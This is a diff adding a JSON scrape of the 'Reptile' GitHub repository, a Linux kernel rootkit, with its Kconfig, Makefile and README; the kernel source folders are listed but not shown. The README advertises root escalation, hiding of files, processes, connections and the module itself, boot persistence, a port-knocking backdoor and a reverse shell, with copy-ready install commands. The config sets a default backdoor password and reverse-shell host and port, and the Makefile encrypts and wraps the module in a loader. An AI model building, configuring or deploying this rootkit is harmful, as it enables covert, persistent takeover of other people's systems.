@@ -1,0 +1,62 @@
+{
+  "metadata": {
+    "timestamp": 1736709901686,
+    "page": 404,
+    "hasNextPage": true,
+    "endCursor": "Y3Vyc29yOjQxMA==",
+    "completionStatus": "IN_PROGRESS"
+  },
+  "repositories": [
+    {
+      "nameWithOwner": "f0rb1dd3n/Reptile",
+      "stars": 2638,
+      "defaultBranch": "master",
+      "files": [
+        {
+          "name": ".gitignore",
+          "type": "blob",
+          "size": 0.0078125,
+          "content": ".vscode/"
+        },
+        {
+          "name": "Kconfig",
+          "type": "blob",
+          "size": 1.876953125,
+          "content": "mainmenu \"Reptile's configuration\"\n\ncomment \"Chose the features you wanna enable\"\n\nconfig CONFIG_BACKDOOR\n    bool \"Backdoor\"\n    default y\n\nmenu \"Backdoor configuration\"\n    depends on CONFIG_BACKDOOR\n        \n    config MAGIC_VALUE\n        string \"Magic value to magic packets\"\n        default \"hax0r\"\n\n    config PASSWORD\n        string \"Backdoor password\"\n        default \"s3cr3t\"\n\n    config SRCPORT\n        int \"Source port of magic packets\"\n        default 666\n        range 0 65535\n\n    comment \"END\"\nendmenu \n\nconfig CONFIG_FILE_TAMPERING\n    bool \"Hide specific file contents\"\n    default y\n\nmenu \"Name used in file tampering tags\"\n    depends on CONFIG_FILE_TAMPERING\n    \n    config TAG_NAME\n        string \"Tag name that hide file contents\"\n        default \"reptile\"\n                \n    comment \"END\"\nendmenu\n\nconfig CONFIG_HIDE_PROC\n    bool \"Hide process\"\n    default y\n\nconfig CONFIG_HIDE_DIR\n    bool \"Hide files and directories\"\n    default y\n    \nmenu \"Hide name (needed to create Reptile's folder)\"\n    config HIDE\n        string \"Hide name\"\n        default \"reptile\"\n            \n    comment \"END\"\nendmenu\n\nconfig CONFIG_HIDE_CONN\n    bool \"Hide TCP and UDP connections\"\n    default y\n\nconfig CONFIG_AUTO_HIDE\n    bool \"Hide kernel module itself\"\n    default y\n\nconfig CONFIG_GIVE_ROOT\n    bool \"Enable give root to a process run by an unprivileged user\"\n    default y\n\nconfig CONFIG_RSHELL_ON_START\n    bool \"Would you like to launch the reverse shell daemon on start?\"\n    default n\n    \nmenu \"Reverse shell daemon configuration\"\n    depends on CONFIG_RSHELL_ON_START\n\n    config LHOST\n        string \"Host to receive the reverse shell\"\n        default \"127.0.0.1\"\n        \n    config LPORT\n        string \"Port get the reverse shell\"\n        default \"4444\"\n\n    config INTERVAL\n        string \"How long is your interval? (in seconds)\"\n        default \"1800\"\n            \n    comment \"END\"\nendmenu\n"
+        },
+        {
+          "name": "Makefile",
+          "type": "blob",
+          "size": 1.80859375,
+          "content": "CC := gcc\nRM = rm -rf\nSHELL := /bin/bash\nPWD := $(shell pwd)\nKERNEL := /lib/modules/$(shell uname -r)/build\nCLIENT_DIR ?= $(PWD)/userland\nCONFIG_SCRIPT ?= $(PWD)/scripts/kconfig/config.sh\nCONFIG_FILE ?= $(PWD)/.config\nGEN_RANDOM ?= $(PWD)/scripts/random.sh\nBUILD_DIR ?= $(PWD)/output\nBUILD_DIR_MAKEFILE ?= $(BUILD_DIR)/Makefile\nMODULE_DIR ?= $(PWD)/kernel\nENCRYPT_SRC ?= $(PWD)/kernel/encrypt/encrypt.c\nENCRYPT ?= $(BUILD_DIR)/encrypt\nKMATRYOSHKA_DIR ?= $(PWD)/kernel/kmatryoshka\nPARASITE ?= $(BUILD_DIR)/reptile_module.ko\nRAND1 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e\"%x\"')\nRAND2 = 0x$(shell cat /dev/urandom | head -c 4 | hexdump '-e\"%x\"')\nINCLUDE ?= -I$(PWD)/kernel/include\nLOADER ?= $(PWD)/kernel/loader/loader.c\nINSTALLER ?= $(PWD)/scripts/installer.sh\n\nall: $(BUILD_DIR_MAKEFILE) userland_bin $(ENCRYPT) module kmatryoshka reptile\n\nreptile: $(LOADER)\n\t@ $(ENCRYPT) $(BUILD_DIR)/reptile.ko $(RAND2) > $(BUILD_DIR)/reptile.ko.inc\n\t@ echo \"  CC      $(BUILD_DIR)/$@\"\n\t@ $(CC) $(INCLUDE) -I$(BUILD_DIR) $< -o $(BUILD_DIR)/$@\n\nkmatryoshka:\n\t@ $(ENCRYPT) $(PARASITE) $(RAND1) > $(BUILD_DIR)/parasite_blob.inc\n\t@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(KMATRYOSHKA_DIR)\n\nmodule:\n\t@ $(MAKE) -C $(KERNEL) M=$(BUILD_DIR) src=$(MODULE_DIR)\n\n$(ENCRYPT): $(ENCRYPT_SRC)\n\t@ echo \"  CC      $(ENCRYPT)\"\n\t@ $(CC) $(INCLUDE) -std=c99 $< -o $@\n\n$(BUILD_DIR):\n\t@ mkdir -p $(BUILD_DIR)\n\n$(BUILD_DIR_MAKEFILE): $(BUILD_DIR)\n\t@ touch $@\n\nconfig:\n\t@ $(SHELL) $(CONFIG_SCRIPT) $@\n\t@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)\n\n%config:\n\t@ $(SHELL) $(CONFIG_SCRIPT) $@\n\t@ $(SHELL) $(GEN_RANDOM) $(CONFIG_FILE)\n\nuserland_bin:\n\t@ $(MAKE) -C $(CLIENT_DIR) EXTRA_FLAGS=-D_REPTILE_\n\ninstall:\n\t@ $(SHELL) $(INSTALLER)\n\nclient: $(BUILD_DIR)\n\t@ $(MAKE) -C $(CLIENT_DIR) packet listener client\n\n.PHONY : clean module config\n\nclean:\n\t@ $(RM) $(BUILD_DIR) $(CONFIG_FILE)"
+        },
+        {
+          "name": "README.md",
+          "type": "blob",
+          "size": 2.1318359375,
+          "content": "# Reptile\n\n<img align=\"left\" src=\"https://imgur.com/nqujOlz.png\">\n\n<br><br><br><br><br>\n<br><br><br><br><br>\n\n## Tested on\n\n**Debian 9**: 4.9.0-8-amd64<br>\n**Debian 10**: 4.19.0-8-amd64<br>\n**Ubuntu 18.04.1 LTS**: 4.15.0-38-generic<br>\n**Kali Linux**: 4.18.0-kali2-amd64<br>\n**Centos 6.10**: 2.6.32-754.6.3.el6.x86_64<br>\n**Centos 7**: 3.10.0-862.3.2.el7.x86_64<br>\n**Centos 8**: 4.18.0-147.5.1.el8_1.x86_64\n\n## Features\n\n- Give root to unprivileged users\n- Hide files and directories\n- Hide processes\n- Hide himself\n- Hide TCP/UDP connections\n- Hidden boot persistence\n- File content tampering\n- Some obfuscation techniques\n- ICMP/UDP/TCP port-knocking backdoor\n- Full TTY/PTY shell with file transfer\n- Client to handle Reptile Shell\n- Shell connect back each X times (not default)\n   \n## Install\n```\napt install build-essential libncurses-dev linux-headers-$(uname -r)\ngit clone https://github.com/f0rb1dd3n/Reptile.git\ncd Reptile\nmake menuconfig           # or 'make config' or even 'make defconfig'\nmake\nmake install\n```\nMore details about the installation see [Wiki](https://github.com/f0rb1dd3n/Reptile/wiki/Install)\n## Uninstall\n\nWhen you got a sucessfully installation, the way to remove that will be shown in the screen\n\n## Usage\n\nSee [Wiki](https://github.com/f0rb1dd3n/Reptile/wiki/Usage) to usage details. So, read the fucking manual before opening an issue!\n\n## Warning\n\nSome functions of this module is based on another rootkits. Please see the references!\n\n## References\n\n- “[LKM HACKING](http://www.ouah.org/LKM_HACKING.html)”, The Hackers Choice (THC), 1999;\n- https://github.com/mncoppola/suterusu\n- https://github.com/David-Reguera-Garcia-Dreg/enyelkm.git\n- https://github.com/creaktive/tsh\n- https://github.com/brenns10/lsh\n\n## Thanks\n\nSpecial thanks to my friend [Ilya V. Matveychikov](https://github.com/milabs) for the [KHOOK](https://github.com/milabs/khook) framework and [kmatryoshka](https://github.com/milabs/kmatryoshka) loader.\n\n## Disclaimer\n\nIf you wanna more information, send me an e-mail: f0rb1dd3n@tuta.io\n\n<p align=\"center\">\n   <img src=\"http://2.bp.blogspot.com/-OMozG1JNxic/VQxKMfiU2EI/AAAAAAAAOQM/_suBsIa9O7c/s1600/Reptile%2B6.gif\">\n</p>\n"
+        },
+        {
+          "name": "configs",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "kernel",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "scripts",
+          "type": "tree",
+          "content": null
+        },
+        {
+          "name": "userland",
+          "type": "tree",
+          "content": null
+        }
+      ]
+    }
+  ]
+}
